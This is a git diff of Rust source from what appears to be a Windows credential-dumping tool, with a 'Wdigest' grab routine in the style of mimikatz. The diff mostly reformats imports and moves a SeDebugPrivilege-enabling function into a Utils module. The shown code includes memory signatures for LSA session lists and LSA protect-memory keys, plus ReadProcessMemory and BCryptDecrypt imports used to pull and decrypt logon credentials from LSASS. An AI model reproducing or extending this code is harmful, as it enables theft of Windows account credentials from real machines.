@@ -1,34 +1,84 @@
-use winapi::um::processthreadsapi::{OpenProcess, OpenProcessToken, GetCurrentProcess};
-use winapi::shared::minwindef::{DWORD, FALSE, LPVOID, HMODULE, USHORT, PUCHAR, PBYTE};
-use winapi::shared::ntdef::{NULL, ULONG};
-use winapi::um::winnt::{HANDLE, PVOID, PROCESS_VM_READ, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES, SE_PRIVILEGE_ENABLED, PROCESS_QUERY_INFORMATION, LUID};
-use winapi::um::winbase::{LookupPrivilegeValueW};
-use winapi::um::securitybaseapi::{AdjustTokenPrivileges};
-use winapi::um::handleapi::CloseHandle;
+use crate::utilities::Utils;
+
+use winapi::um::processthreadsapi::OpenProcess;
+
+use winapi::shared::minwindef::{
+    DWORD, 
+    FALSE, 
+    LPVOID, 
+    HMODULE, 
+    USHORT, 
+    PUCHAR, 
+    PBYTE
+};
+
+use winapi::shared::ntdef::{
+    NULL, 
+    ULONG
+};
+
+use winapi::um::winnt::{
+    HANDLE,
+    PVOID, 
+    PROCESS_VM_READ,
+    PROCESS_QUERY_INFORMATION,
+    LUID
+};
+
 use winapi::um::memoryapi::ReadProcessMemory;
-use winapi::um::psapi::{EnumProcessModulesEx, GetModuleFileNameExA};
-use winapi::um::libloaderapi::{LoadLibraryW};
-use sysinfo::{ProcessExt, System, SystemExt};
+
+use winapi::um::psapi::{
+    EnumProcessModulesEx, 
+    GetModuleFileNameExA
+};
+
+use winapi::um::libloaderapi::LoadLibraryW;
+
+use sysinfo::{
+    ProcessExt, 
+    System, 
+    SystemExt
+};
+
 use std::convert::TryInto;
-use byteorder::{ByteOrder};
-use std::{ptr::null_mut};
+use byteorder::ByteOrder;
+use std::ptr::null_mut;
 
-use anyhow::{anyhow, Result};
+use anyhow::{
+    anyhow, 
+    Result
+};
 
-use winapi::shared::bcrypt::{MS_PRIMITIVE_PROVIDER, BCryptOpenAlgorithmProvider, BCryptSetProperty, BCryptGenerateSymmetricKey, BCryptDecrypt, BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE, BCRYPT_AES_ALGORITHM, BCRYPT_3DES_ALGORITHM};
-use winapi::shared::bcrypt::{BCRYPT_CHAIN_MODE_CFB, BCRYPT_CHAIN_MODE_CBC, BCRYPT_CHAINING_MODE};
+use winapi::shared::bcrypt::{
+    MS_PRIMITIVE_PROVIDER, 
+    BCryptOpenAlgorithmProvider, 
+    BCryptSetProperty, 
+    BCryptGenerateSymmetricKey, 
+    BCryptDecrypt, 
+    BCRYPT_ALG_HANDLE, 
+    BCRYPT_KEY_HANDLE, 
+    BCRYPT_AES_ALGORITHM, 
+    BCRYPT_3DES_ALGORITHM
+};
 
-use winreg::{enums::*, RegKey};
+use winapi::shared::bcrypt::{
+    BCRYPT_CHAIN_MODE_CFB, 
+    BCRYPT_CHAIN_MODE_CBC, 
+    BCRYPT_CHAINING_MODE
+};
+
+use winreg::{
+    enums::*, 
+    RegKey
+};
 
 use std::io::Error;
 use std::process;
-use std::ffi::{OsStr};
+use std::ffi::OsStr;
 use std::os::windows::ffi::OsStrExt;
 use std::u32;
 
 const LOG_SESS_LIST_SIGNATURE: [u8; 4] = [72, 59, 217, 116];
-
-const SE_DEBUG_NAME: [u16 ; 17] = [83u16, 101, 68, 101, 98, 117, 103, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0]; 
 
 const WIN10_LSAINITIALIZE_PROTECT_MEMORY_KEY: [u8; 16] = [131, 100, 36, 48, 0, 72, 141, 69, 224, 68, 139, 77, 216, 72, 141, 21];
 const WIN8_LSAINITIALIZE_PROTECT_MEMORY_KEY: [u8; 12] = [131, 100, 36, 48, 0, 68, 139, 77, 216, 72, 139, 13];
@@ -116,7 +166,7 @@ pub struct Wdigest;
 
 impl Wdigest {
     pub fn grab() -> Result<()> {
-        let (debug_boolean, debug_result) = enable_debug_privilege();
+        let (debug_boolean, debug_result) = Utils::enable_debug_privilege();
         if debug_boolean {
             println!("{}", debug_result);
 
@@ -177,38 +227,6 @@ fn get_process_handle(process_id: DWORD) -> Result<HANDLE, Error> {
             Err(Error::last_os_error())
         } else {
             Ok(process)
-        }
-    }
-}
-
-fn enable_debug_privilege() -> (bool, String) {
-    unsafe {
-        let mut token = null_mut();
-        let mut privilege: TOKEN_PRIVILEGES = std::mem::zeroed();
-
-        privilege.PrivilegeCount = 1;
-	    privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-        let result = LookupPrivilegeValueW(null_mut(), SE_DEBUG_NAME.as_ptr(), &mut privilege.Privileges[0].Luid);
-        if result == FALSE {
-            return (false, format!("[x] LookupPrivilege Error: {}", Error::last_os_error()));
-        } else {
-            let res = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token);
-            if res == FALSE {
-                return (false, format!("[x] OpenProcessToken Error: {}", Error::last_os_error()));
-            } else {
-                let token_adjust = AdjustTokenPrivileges(token, FALSE, &mut privilege, std::mem::size_of_val(&privilege) as u32, null_mut(), null_mut());
-                if token_adjust == FALSE {
-                    return (false, format!("[x] AdjustTokenPrivileges Error: {}", Error::last_os_error()));
-                } else {
-                    let close_handle = CloseHandle(token);
-                    if close_handle == FALSE {
-                        return (false, format!("[x] CloseHandle Error: {}", Error::last_os_error()));
-                    } else {
-                        return (true, format!("[!] Trying to enable debug privileges"));
-                    }
-                }
-            }
         }
     }
 }
